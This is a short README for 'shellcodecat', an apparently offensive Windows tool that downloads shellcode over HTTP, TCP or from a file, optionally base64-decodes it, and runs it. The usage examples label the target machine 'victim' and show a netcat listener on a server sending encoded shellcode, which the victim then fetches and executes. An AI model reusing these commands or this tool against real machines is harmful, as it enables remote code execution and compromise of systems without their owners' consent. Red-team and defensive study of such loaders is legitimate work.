# shellcodecat

shellcodecat is a tool to launch your shellcode from http, tcp or file on Windows platform

## compile

if you want to launch x64 shellcode you should compile the x64 version

## usage

```
usage: shellcodecat.exe [-h] --[tcp|file|http] location
 arguments :
 -h, --help             show this help message and exit
 --tcp <ip:port>        get file by tcp
 --file <path>          file by py path
 --http <url>           file by http
 -b                     using base64 decode the data
```

some example:

```
# get shellcode from http
victim > shellcodecat.exe --http http://hostname/path/to/file

# get shellcode from http using base64 encode
server > cat shellcode.bin|base64 -w 0|nc -lv -p 7777
victim >shellcodecat.exe --tcp x.x.x.x:7777 -b
```





